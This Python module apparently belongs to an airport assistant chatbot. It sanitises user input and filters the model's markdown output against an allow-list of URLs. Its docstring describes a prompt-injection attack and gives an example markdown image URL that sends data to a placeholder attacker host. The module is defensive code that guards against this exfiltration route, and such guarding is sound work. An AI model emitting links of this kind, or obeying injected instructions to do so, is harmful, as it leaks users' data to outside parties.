"""Trust boundaries B1 (user input in) and B4 (model output out).

B4 exists because markdown images and links are an exfiltration channel: an injected
instruction can make the model emit ![](https://attacker/?data=...) which the browser fetches.
"""

import re
import unicodedata

from airport_agent import config

ZERO_WIDTH_AND_BIDI = re.compile("[\u200b-\u200f\u202a-\u202e\u2060-\u2064\ufeff]")
CONTROL = re.compile(r"[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]")
IMAGE = re.compile(r"!\[[^\n]*?\]\([^)]*\)")
LINK = re.compile(r"\[([^\n]*?)\]\(([^)\s]+)[^)]*\)")
AUTOLINK = re.compile(r"<(https?://[^>\s]+)>", re.I)
BARE_URL = re.compile(r"https?://[^\s<>\]]+", re.I)
TRAILING_PUNCT = ".,;:!?"


class InputRejected(ValueError):
    """Raised with a message that is safe to show to the user."""


def clean_user_input(text: str) -> str:
    text = unicodedata.normalize("NFKC", text or "")
    text = ZERO_WIDTH_AND_BIDI.sub("", text)
    text = CONTROL.sub("", text)
    text = re.sub(r"[ \t]+", " ", text).strip()
    if not text:
        raise InputRejected("Please type a question.")
    if len(text) > config.MAX_INPUT_CHARS:
        raise InputRejected(
            f"Please keep questions under {config.MAX_INPUT_CHARS:,} characters."
        )
    return text


def filter_output(markdown: str, allowed_urls: set[str]) -> str:
    out = IMAGE.sub("", markdown)
    out = LINK.sub(lambda m: m.group(0) if m.group(2) in allowed_urls else m.group(1), out)
    out = AUTOLINK.sub(
        lambda m: m.group(0) if m.group(1) in allowed_urls else "[link removed]", out
    )
    return BARE_URL.sub(lambda m: _bare_url(m, allowed_urls), out)


def _bare_url(m: re.Match, allowed_urls: set[str]) -> str:
    url, tail = m.group(0), ""
    while url and (
        url[-1] in TRAILING_PUNCT or (url[-1] == ")" and url.count(")") > url.count("("))
    ):
        url, tail = url[:-1], url[-1] + tail
    return (url if url in allowed_urls else "[link removed]") + tail
